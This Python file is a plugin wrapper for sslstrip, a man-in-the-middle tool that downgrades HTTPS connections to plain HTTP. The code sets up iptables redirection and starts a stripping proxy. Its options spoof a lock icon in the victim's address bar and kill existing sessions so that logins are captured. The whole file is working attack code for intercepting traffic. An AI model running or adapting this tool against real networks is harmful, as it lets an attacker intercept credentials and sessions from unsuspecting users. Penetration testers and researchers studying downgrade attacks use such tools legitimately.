"""sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping attacks."""
 
__author__ = "Moxie Marlinspike && Version + by Leonardo Nve"
__email__  = "moxie@thoughtcrime.org && leonardo.nve@gmail.com"
__license__= """
Copyright (c) 2004-2009 Moxie Marlinspike <moxie@thoughtcrime.org>
 
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License as
published by the Free Software Foundation; either version 3 of the
License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but
WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
USA

"""

from twisted.web import http
from twisted.internet import reactor

from sslstrip.StrippingProxy import StrippingProxy
from sslstrip.URLMonitor import URLMonitor
from sslstrip.CookieCleaner import CookieCleaner
from plugin import Plugin

from core import iptables

import sys, getopt, logging, traceback, string, os

gVersion = "0.9 +"

class Sslstrip2(Plugin):

    name = 'sslstrip2'
    optname = 'sslstrip2'
    desc = 'Stripping proxy'
    sleep_time = 2

    def initialize(self, options):

        self.configs = {
        
            'log_file' : options.log_file,
            'listen_port' : options.listen_port,
            'spoof_favicon' : options.spoof_favicon,
            'kill_sessions' : options.kill_sessions,
        
        }

        iptables.sslstrip(phy=options.phy)

    def options(self, options):

        options.add_argument('--log-file',
                        dest='log_file',
                        type=str,
                        required=False,
                        default='sslstrip.log',
                        metavar='<filename>',
                        help='Log output to <filename>')
        options.add_argument('--listen-port',
                        dest='listen_port',
                        type=int,
                        required=False,
                        default=10000,
                        metavar='<port_number>',
                        help='Listen for incoming packets on port <port_number>')
        options.add_argument('--spoof-favicon',
                        dest='spoof_favicon',
                        action='store_true',
                        help="Place spoofed Lock Icon in victim's address bar")
        options.add_argument('--kill_sessions',
                        dest='kill_sessions',
                        action='store_true',
                        help='Kill existing sessions')

    @staticmethod
    def _start(configs):

        logFile = configs['log_file']
        listenPort = configs['listen_port']
        spoofFavicon = configs['spoof_favicon']
        killSessions = configs['kill_sessions']
        logLevel = logging.WARNING
    
        logging.basicConfig(level=logLevel, format='%(asctime)s %(message)s',
                            filename=logFile, filemode='w')
    
        URLMonitor.getInstance().setFaviconSpoofing(spoofFavicon)
        CookieCleaner.getInstance().setEnabled(killSessions)
    
        strippingFactory              = http.HTTPFactory(timeout=10)
        strippingFactory.protocol     = StrippingProxy
    
        reactor.listenTCP(int(listenPort), strippingFactory)
                    
        print "\nsslstrip " + gVersion + " by Moxie Marlinspike running..."
        print "+ POC by Leonardo Nve"
    
        reactor.run()

